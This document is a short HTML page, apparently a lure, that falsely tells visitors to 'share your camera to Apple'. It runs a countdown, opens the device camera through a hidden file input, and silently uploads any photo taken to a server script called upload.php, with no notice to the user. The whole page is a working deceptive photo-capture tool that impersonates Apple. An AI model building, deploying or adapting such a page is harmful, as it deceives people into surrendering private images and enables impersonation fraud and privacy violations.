<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    h1 {
        margin: 1em;
    }

    #countdown {
        font-size: 24px;
        margin: 1em;
        display: none;
    }

    #openCamBtn {
        display: none;
        padding: 15px 20px;
        background: #007bff;
        color: white;
        border-radius: 10px;
        text-decoration: none;
        font-size: 18px;
    }

    img {
        width: 100%;
    }
</style>

<h1>Tap to share your camera to Apple</h1>

<input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />

<div id="countdown"></div>

<a id="openCamBtn" href="#">Open Camera</a>

<img id="img" src="">

<a id="link" href="https://google.com" target="_blank">
    Tap here to start
</a>

<script>
    const countdownEl = document.getElementById("countdown");
    const openCamBtn = document.getElementById("openCamBtn");
    const fileSelect = document.getElementById("fileSelect");

    document.getElementById('link').onclick = () => {
        let timeLeft = 5;

        countdownEl.style.display = "block";
        countdownEl.innerText = "Opening camera in " + timeLeft + "...";

        const timer = setInterval(() => {
            timeLeft--;
            countdownEl.innerText = "Opening camera in " + timeLeft + "...";

            if (timeLeft <= 0) {
                clearInterval(timer);
                countdownEl.style.display = "none";
                openCamBtn.style.display = "inline-block";
            }
        }, 1000);
    };

    // User must tap this â†’ allowed by browser
    openCamBtn.onclick = () => {
        fileSelect.click();
    };

    // When photo selected
    fileSelect.onchange = (event) => {
        const file = event.target.files[0];
        if (file) {
            document.getElementById("img").src = URL.createObjectURL(file);

            const formData = new FormData();
            formData.append("file", file);

            fetch("upload.php", {
                method: "POST",
                body: formData
            })
            .then(r => r.text())
            .then(result => console.log("Success:", result))
            .catch(error => console.error("Error:", error));
        }
    };
</script>
